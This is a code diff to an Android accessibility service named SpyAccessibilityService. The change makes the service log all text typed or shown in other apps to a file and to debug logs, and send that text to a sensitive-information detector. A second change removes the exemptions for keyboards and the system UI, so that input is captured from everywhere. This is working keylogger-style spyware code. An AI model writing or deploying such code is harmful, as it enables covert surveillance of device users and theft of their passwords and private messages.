@@ -131,6 +131,30 @@ class SpyAccessibilityService : AccessibilityService() {
     private fun handleTextChanged(event: AccessibilityEvent) {
         val packageName = event.packageName?.toString() ?: "unknown"
 
+        event.text?.let { textList ->
+            for (i in 0 until textList.size) {
+                val text = textList[i]?.toString()
+                if (!text.isNullOrEmpty() && text.length > 0) {
+                    logToFile("TEXT in $packageName: '$text'")
+                    detectSensitiveInfo(text, packageName)
+                }
+            }
+        }
+
+        // DEBUG: Log all text change events
+        Log.d(TAG, "DEBUG: TextChanged from $packageName")
+        Log.d(TAG, "DEBUG: Event type: ${getEventTypeName(event.eventType)}")
+
+        // Log the actual text if available
+        event.text?.let { textList ->
+            for (i in 0 until textList.size) {
+                val text = textList[i]?.toString()
+                if (!text.isNullOrEmpty()) {
+                    Log.d(TAG, "DEBUG: Text in event: '$text'")
+                }
+            }
+        }
+        
         // Try to get the focused text field
         var root: AccessibilityNodeInfo? = null
         var focusedNode: AccessibilityNodeInfo? = null
@@ -301,10 +325,7 @@ class SpyAccessibilityService : AccessibilityService() {
     }
 
     private fun shouldSkipField(packageName: String, className: String): Boolean {
-        return packageName.contains("inputmethod") ||
-                className.contains("Keyboard") ||
-                className.contains("ime") ||
-                packageName.contains("systemui")
+        return false
     }
 
     private fun detectSensitiveInfo(text: String, packageName: String) {
